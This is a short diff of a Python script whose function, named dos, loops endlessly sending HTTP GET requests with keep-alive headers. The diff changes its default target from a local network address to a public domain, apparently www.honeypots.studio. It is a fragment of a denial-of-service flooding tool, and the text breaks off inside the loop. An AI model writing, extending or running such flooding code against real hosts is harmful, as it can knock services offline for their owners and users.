@@ -2,7 +2,7 @@ import threading
 import sys
 import requests
 
-def dos(url = "http://192.168.1.49:5000/"):
+def dos(url = "http://www.honeypots.studio"):
     while True:
         try:
             requests.get(url, headers={'Connection' : 'keep-alive'})
